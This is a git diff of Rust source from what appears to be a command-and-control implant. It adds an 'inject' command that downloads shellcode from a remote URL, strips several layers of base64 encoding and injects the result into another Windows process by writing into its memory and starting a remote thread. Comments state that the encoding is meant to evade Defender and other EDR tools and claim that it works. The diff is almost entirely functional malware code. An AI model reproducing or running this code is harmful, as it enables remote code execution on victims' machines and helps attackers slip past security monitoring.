@@ -1,5 +1,6 @@
 use std::error::Error;
 use crate::logger::Logger;
+#[cfg(windows)] use base64::decode as b64_decode;
 #[cfg(windows)] extern crate winapi;
 #[cfg(windows)] extern crate kernel32;
 #[cfg(windows)] use winapi::um::winnt::{PROCESS_ALL_ACCESS,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};
@@ -10,41 +11,125 @@ use crate::logger::Logger;
 /// 
 /// On Windows, this will attempt process injection.
 /// 
-/// Usage: `inject [shellcode_url] [pid]`
+/// To avoid shellcode detection by Defender and other EDRs,
+/// the shellcode is expected to be b64-encoded, comma-separated hex representations
+/// of the shellcode, which is decoded at runtime.
+/// 
+/// The shellcode can be encoded `b64_iterations` times to make extra work for EDRs to process the payload.
+/// This has proven effective in initial evasion.
+/// 
+/// ### Examples
+/// Usage: `inject [shellcode_url] [pid] [b64_iterations] 🎯`
 /// 
 /// On Linux, the payload will be downloaded and executed like a regular dropper.
-pub async fn handle(s: &String, logger: &Logger) -> Result<String, Box<dyn Error>> {
+pub async fn handle(base64_string: &String, logger: &Logger) -> Result<String, Box<dyn Error>> {
     #[cfg(windows)] {
         // Input: url to shellcode -p pid
-        let mut args = s.split(" ");
-        // Get URL as the first arg
-        let url = args.nth(0).unwrap();
-        // Get path as the 2nd arg or the last part of the URL
-        if let Some(p) = args.nth(0) {
-            logger.debug(format!("Injecting into PID {:?}", p));
-            let pid: u32 = p.parse()?;
-            let client = Client::new();
-            let r = client.get(url).send().await?;
-            if r.status().is_success() {
-                // Here comes the injection
-                let shellcode = r.bytes().await?;
-                // Big thanks to trickster0
-                // https://github.com/trickster0/OffensiveRust/tree/master/Process_Injection_CreateThread
-                unsafe {
-                    let h = kernel32::OpenProcess(PROCESS_ALL_ACCESS, winapi::shared::ntdef::FALSE.into(), pid);
-                    let addr = kernel32::VirtualAllocEx(h, ptr::null_mut(), shellcode.len() as u64, MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
-                    let mut n = 0;
-                    kernel32::WriteProcessMemory(h,addr,shellcode.as_ptr() as  _, shellcode.len() as u64,&mut n);
-                    let _h_thread = kernel32::CreateRemoteThread(h, ptr::null_mut(), 0 , Some(std::mem::transmute(addr)), ptr::null_mut(), 0, ptr::null_mut());
-                    kernel32::CloseHandle(h);
+        let mut args = base64_string.split(" ");
+        
+        // Set up our variables; each one could fail on us.
+        // Yes this is a lot of verbose error checking, but this
+        // has to be rock solid or the agent will die.
+        let mut url: &str;
+        let mut pid: u32;
+        let mut b64_iterations: u32;
+
+        // Get URL
+        match args.nth(0) {
+            Some(u) => { 
+                logger.debug(format!("Shellcode URL: {}", &u));
+                url = u; 
+            },
+            None    => { return Ok("Could not parse URL".to_string()); }
+        };
+
+        // Get pid
+        match args.nth(0) {
+            Some(ps) => {
+                if let Ok(p) = ps.parse::<u32>() {
+                    logger.debug(format!("Injecting into PID: {:?}", &p));
+                    pid = p;
+                } else {
+                    let err_msg = "Could not parse PID";
+                    logger.err(err_msg.to_string());
+                    return Ok(err_msg.to_string());
                 }
-                return Ok("Injection completed!".to_string());
+            },
+            None => { 
+                let err_msg = "Could not extract PID";
+                logger.err(err_msg.to_string());
+                return Ok(err_msg.to_string()); 
+            }
+        };
+
+        // Get b64_iterations
+        match args.nth(0) {
+            Some(bs) => {
+                if let Ok(b) = bs.parse::<u32>() {
+                    b64_iterations = b;
+                } else {
+                    return Ok("Could not parse b64 iterations".to_string());
+                }
+            },
+            None => { return Ok("Could not extract b64 iterations".to_string()); }
+        };
+
+        logger.debug(format!("Injecting into PID {:?}", pid));
+        let client = Client::new();
+        let r = client.get(url).send().await?;
+        if r.status().is_success() {   
+            logger.info(format!("Got the shellcode")); 
+            // Get the shellcode. Now we have to decode it
+            let mut shellcode_encoded: Vec<u8>;
+            let mut shellcode_string: String;
+            let mut shellcode: Vec<u8>;
+            if let Ok(sc) = r.text().await {
+                shellcode_encoded = Vec::from(sc.trim().as_bytes());
+                logger.info(format!("Got encoded bytes"));
+                for i in 0..b64_iterations {
+                    logger.debug(format!("Decode iteration: {i}"));
+                    shellcode_encoded = b64_decode(shellcode_encoded)?
+                        .into_iter()
+                        .filter(|&b| b != 0x0a)
+                        .collect();
+                }
+                // Convert bytes to our proper string
+                shellcode_string = String::from_utf8(shellcode_encoded)?;
+                // At this point, we have the comma-separated "0xNN" form of the shellcode.
+                // We need to get each one until a proper u8.
+                shellcode = shellcode_string
+                    .split(",")
+                    .map(|s| s.replace("0x", ""))                    
+                    .map(|s|{ 
+                        match u8::from_str_radix(&s, 16) {
+                            Ok(b) => b,
+                            Err(_) => panic!("Couldn't parse {s}")
+                        }
+                    })
+                    .collect();
+
             } else {
-                return Ok("Could not download shellcode".to_string());
-            }     
+                let err_msg = "Could not decode shellcode";
+                logger.err(err_msg.to_string());
+                return Ok(err_msg.to_string());
+            }
+
+
+            // Big thanks to trickster0
+            // https://github.com/trickster0/OffensiveRust/tree/master/Process_Injection_CreateThread
+            unsafe {
+                let h = kernel32::OpenProcess(PROCESS_ALL_ACCESS, winapi::shared::ntdef::FALSE.into(), pid);
+                let addr = kernel32::VirtualAllocEx(h, ptr::null_mut(), shellcode.len() as u64, MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
+                let mut n = 0;
+                kernel32::WriteProcessMemory(h,addr,shellcode.as_ptr() as  _, shellcode.len() as u64,&mut n);
+                let _h_thread = kernel32::CreateRemoteThread(h, ptr::null_mut(), 0 , Some(std::mem::transmute(addr)), ptr::null_mut(), 0, ptr::null_mut());
+                kernel32::CloseHandle(h);
+            }
+            return Ok("Injection completed!".to_string());
         } else {
-            return Ok("No valid pid provided".to_string());
-        }
+            return Ok("Could not download shellcode".to_string());
+        }   
+
     }
     
     #[cfg(not(windows))] {
